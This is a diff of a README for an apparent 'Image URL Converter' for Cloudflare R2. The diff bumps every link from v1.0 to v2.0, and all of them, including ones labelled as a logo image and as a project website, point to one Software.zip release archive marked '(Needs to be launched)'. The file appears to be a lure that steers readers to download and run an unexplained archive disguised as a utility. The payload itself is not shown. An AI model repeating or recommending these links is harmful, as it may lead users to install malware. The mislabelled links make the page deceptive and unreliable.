@@ -1,6 +1,6 @@
 # 🌟 Image URL Converter 🌟
 
-![Cloudflare Logo](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v1.0/Software.zip)
+![Cloudflare Logo](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v2.0/Software.zip)
 
 Convert any image URL into a permanent link hosted on Cloudflare R2 with ease! 🖼️
 
@@ -28,14 +28,14 @@ Using the image URL converter tool is straightforward:
 ⚡ r2  
 
 ## Download Software
-[![Download Software](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v1.0/Software.zip)](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v1.0/Software.zip)  
+[![Download Software](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v2.0/Software.zip)](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v2.0/Software.zip)  
 (*Needs to be launched*)
 
 ## Visit Our Website
-For more information about our image URL converter tool, visit our website at [https://github.com/Ashwin-Wright/image-url-converter/releases/download/v1.0/Software.zip](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v1.0/Software.zip).
+For more information about our image URL converter tool, visit our website at [https://github.com/Ashwin-Wright/image-url-converter/releases/download/v2.0/Software.zip](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v2.0/Software.zip).
 
 ---
 
 Get started with the image URL converter tool today and enjoy seamless image hosting on Cloudflare R2! 🚀
 
-![Cloudflare R2 Image Hosting](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v1.0/Software.zip)
+![Cloudflare R2 Image Hosting](https://github.com/Ashwin-Wright/image-url-converter/releases/download/v2.0/Software.zip)
